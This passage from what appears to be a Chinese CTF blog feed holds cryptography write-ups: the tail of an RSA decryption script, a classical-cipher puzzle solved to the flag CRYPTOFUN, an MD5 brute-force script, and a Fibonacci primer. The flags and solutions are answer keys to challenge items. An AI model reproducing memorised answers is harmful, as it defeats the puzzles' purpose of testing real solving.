punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>n <span class="token operator">=</span> q<span class="token operator">*</span>p</pre></td></tr><tr><td data-num="18"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://i.loli.net/2021/09/01/xKp1zjeIiDLsSw6.png" alt="微信截图_20210901090524.png" /></p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>今日份的密码学</title>
    <url>/crypto/write/%E4%BB%8A%E6%97%A5%E4%BB%BD%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    <content><![CDATA[<p>在这里记录一个很好用的爆破密码网站<br />
<a id="more"></a><br />
 今天在做一道密码题时发现无论怎样，这个密码都解不开来。<br />
<img data-src="https://i.loli.net/2021/02/27/8Q1sfJvUe2MIp79.png" alt="" title="完全没见过的加密排列" /><br />
于是就和今天这个<span class="exturl" data-url="aHR0cHM6Ly9xdWlwcWl1cC5jb20v">网站</span>邂逅了</p>
<p>直接把密文放入 solve 就可以了，下面会把爆破出来的结果一一列出。<br />
<img data-src="https://i.loli.net/2021/02/27/IPHKnTNwhZpe94O.png" alt="" /></p>
<p>以及凯撒密码都可以使用此类词频分析，自动化爆破。<br />
<img data-src="https://i.loli.net/2021/02/27/XUMyQtSiwxj1AE2.png" alt="" /></p>
<h2 id="脚本工贼都不写"><a class="anchor" href="#脚本工贼都不写">#</a> 脚本？工贼都不写</h2>
<p>Brainfuck and Ook!  ---&gt;   <span class="exturl" data-url="aHR0cHM6Ly93d3cuc3BsaXRicmFpbi5vcmcvc2VydmljZXMvb29r">https://www.splitbrain.org/services/ook</span><br />
 条形码 \ 二维码        ---&gt;   <span class="exturl" data-url="aHR0cHM6Ly9vbmxpbmUtYmFyY29kZS1yZWFkZXIuaW5saXRlcmVzZWFyY2guY29tLw==">https://online-barcode-reader.inliteresearch.com/</span><br />
 猪圈密码 \ 维吉尼亚...  ---&gt;   <span class="exturl" data-url="aHR0cDovL3d3dy5tZXRvb2xzLmluZm8vY29kZS9jOTAuaHRtbA==">http://www.metools.info/code/c90.html</span><br />
Quoted-Printable 编码 ---&gt;   <span class="exturl" data-url="aHR0cDovL3d3dy5teGN6Lm5ldC90b29scy9RdW90ZWRQcmludGFibGUuYXNweA==">http://www.mxcz.net/tools/QuotedPrintable.aspx</span><br />
 (一个等号和一个十六进制的数字)<br />
 Unicode 编码         ---&gt;   <span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvdG9vbHMvb25saW5ldG9vbHMvamllbWkvdW5pZW5kZWNvZGUuaHRt">https://www.jb51.net/tools/onlinetools/jiemi/uniendecode.htm</span><br />
 其他工具             ---&gt;   <span class="exturl" data-url="aHR0cDovL2VuY29kZS5jaGFodW8uY29tLw==">http://encode.chahuo.com/</span></p>
<h2 id="古典密码知多少"><a class="anchor" href="#古典密码知多少">#</a> 古典密码知多少</h2>
<p><img data-src="https://i.loli.net/2021/02/27/uRHNm9SM3ifIJPl.jpg" alt="" title="uhh..可以说是掺杂了各种密码的图谱" /><br />
hint 提示最后可能需要用到栅栏密码，还要求我们所有字母大写</p>
<p>紫色部分有些基础的都可以看出是猪圈密码，我们参照猪圈密码的解码图解开就好了<br />
<img data-src="https://i.loli.net/2021/02/27/v1ZjQlWVEdXLhTB.png" alt="" /></p>
<p>get &quot;FGCP&quot; 和 &quot;A&quot; &quot;N&quot;</p>
<p>橙色部分不太常见，通过百度知道叫做圣殿骑士 (串戏) 密码，由猪圈密码演化而来<br />
<img data-src="https://i.loli.net/2021/02/27/nwBV8d6butsQ3CS.png" alt="" /></p>
<p>参照译文得到 &quot;FLI&quot; &quot;S&quot;</p>
<p>最后，黑色部分更更更没听说过了<br />
<img data-src="https://i.loli.net/2021/02/27/iaKsltmrSZqXGxT.jpg" alt="" /><br />
后来百度搜图才知道是个银河什么密码<br />
不知道该怎么办，给大家表演个原地死王八 *<br />
<img data-src="https://i.loli.net/2021/02/27/ui3WsQzAkxFLTMc.png" alt="" /><br />
get &quot;rtu&quot; &quot;yo&quot;</p>
<p>综上排列一下<br />
 &quot;FGCPFLIRTUASYON&quot;<br />
 解密得到<br />
 &quot;FLAGISCRYPTOFUN&quot;<br />
 即 flag 为 CRYPTOFUN</p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>修复破碎的MD5</title>
    <url>/crypto/write/%E4%BF%AE%E5%A4%8D%E7%A0%B4%E7%A2%8E%E7%9A%84MD5/</url>
    <content><![CDATA[<p>我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM, 问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的 32 位 MD5 码。但是我们获得它的 32 位 MD5 码也是残缺不全，E903???4DAB????08?????51?80??8A?<br />
<a id="more"></a><br />
 已知字符串缺少三个大写字母，我们只需爆破字符串即可恢复 MD5</p>
<h1 id="python脚本"><a class="anchor" href="#python脚本">#</a> Python 脚本</h1>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib   </pre></td></tr><tr><td data-num="2"></td><td><pre>src1<span class="token operator">=</span><span class="token string">"TASC"</span></pre></td></tr><tr><td data-num="3"></td><td><pre>src2<span class="token operator">=</span><span class="token string">"O3RJMV"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>src3<span class="token operator">=</span><span class="token string">"WDJKX"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>src4<span class="token operator">=</span><span class="token string">"ZM"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>dic <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'J'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            src<span class="token operator">=</span>src1<span class="token operator">+</span>dic<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>src2<span class="token operator">+</span>dic<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>src3<span class="token operator">+</span>dic<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">+</span>src4 <span class="token comment">#恢复字符串</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            s1<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>src<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token comment"># hash.hexdigest() </span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token comment"># 返回摘要，作为十六进制数据字符串值</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'E903'</span><span class="token punctuation">:</span> <span class="token comment">#筛选</span></pre></td></tr><tr><td data-num="15"></td><td><pre>              <span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span></pre></td></tr></table></figure><p>最后得到完整的 MD5</p>
<p>E9032994DABAC08080091151380478A2</p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>MD5修复</tag>
      </tags>
  </entry>
  <entry>
    <title>达芬奇密码</title>
    <url>/crypto/write/%E8%BE%BE%E8%8A%AC%E5%A5%87%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>斐波那契数列<br />
<a id="more"></a></p>
<h2 id="斐波那契数列"><a class="anchor" href="#斐波那契数列">#</a> 斐波那契数列</h2>
<p>在解决这道题目之前我们首先先了解一下什么是斐波那契数列：<br />
斐波那契数列的由来源于一位意大利青年，名叫斐波那契。在他的一部著作中提出了一个有趣的问题：假设一对刚出生的小兔一个月后就能长成大兔，再过一个月就能生下一对小兔，并且此后每个月都生一对小兔，一年内没有发生死亡，问：一对刚出生的兔子，一年内繁殖成多少对兔子？<br />
 为了更清晰一点，我们作出下面的示意图。</p>
<p><img data-src="https://i.loli.net/2021/09/05/61NEXZWinysqBzA.jpg" alt="v2-2c689f0a974765945c0c36bd9571dab6_720w.jpg" /></p>
<p>在图中，我们的黑点表示的是成熟兔子，白点表示的是小兔子。我们够仔细的话能够发现，右边这一列数字是有规律的。第一个数和第二个数为 1，之后的每一个数为之前两个数之和。比如，六月份的兔子数量为四月份和五月份兔子数量之和，即 8=5+3。<br />
此外，我们再仔细看一下，六月份的兔子中有五对黑（成熟）兔子和三对白兔子，8=5+3。同样是 8=5+3，但是该等式和上式中的 5 与 3 表示了不同的意义，那么他们之间是否存在本质的联系呢。实际上 5 对黑兔子就是上个月的 5 对兔子变来的，只不过其中的白兔子都变为了黑兔子，即 5=5； 三只白兔子从哪来的，它们是四月份的三对兔子生的，不管黑白，到了五月份都是黑兔子，六月份的时候也就只有它们能生小兔子，而且必须生一对小兔子，所以 3=3。</p>
<p>由此，我们甚至可以预测到未来的兔子数量</p>
<p><img data-src="https://i.loli.net/2021/09/05/iVRHzqB6j4urOcK.png" alt="v2-daacceedc4abfe31b1bb29a7d3ba0913_720w.png" /></p>
<h3 id="斐波那契数列的特性"><a class="anchor" href="#斐波那契数列的特性">#</a> 斐波那契数列的特性</h3>
<p>斐波那契数列：1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233……<br />
 观察一下上面的数列，你发现有什么特征吗？</p>
<ol>
<li>第一项和第二项是 1，之后的每一项为之前两项的和。</li>
</ol>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>=</mo><msub><mi>a</mi><mn>2</mn></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">a_1=a_2=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p>
<p>即：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><msub><mi>a</mi><mo stretchy="false">(</mo></msub><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><msub><mi>a</mi><mo stretchy="false">(</mo></msub><mi>n</mi><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_n=a_(n-1)+a_(n-2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9385299999999999em;vertical-align:-0.3551999999999999em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mopen mtight">(</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9385299999999999em;vertical-align:-0.3551999999999999em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mopen mtight">(</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span></span></span></span></p>
<ol start="2">
<li>对每一项做平方</li>
</ol>
<p>前几项平方求和求和：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>1</mn><mn>2</mn></msup><mo>+</mo><msup><mn>1</mn><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">1^2+1^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>=2</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>1</mn><mn>2</mn></msup><mo>+</mo><msup><mn>1</mn><mn>2</mn></msup><mo>+</mo><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">1^2+1^2+2^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>=6</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>1</mn><mn>2</mn></msup><mo>+</mo><msup><mn>1</mn><mn>2</mn></msup><mo>+</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><msup><mn>3</mn><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">1^2+1^2+2^2+3^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>=15</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>1</mn><mn>2</mn></msup><mo>+</mo><msup><mn>1</mn><mn>2</mn></msup><mo>+</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><msup><mn>3</mn><mn>2</mn></msup><mo>+</mo><msup><mn>5</mn><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">1^2+1^2+2^2+3^2+5^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>=40</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>1</mn><mn>2</mn></msup><mo>+</mo><msup><mn>1</mn><mn>2</mn></msup><mo>+</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><msup><mn>3</mn><mn>2</mn></msup><mo>+</mo><msup><mn>5</mn><mn>2</mn></msup><mo>+</mo><msup><mn>8</mn><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">1^2+1^2+2^2+3^2+5^2+8^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">8</span><span 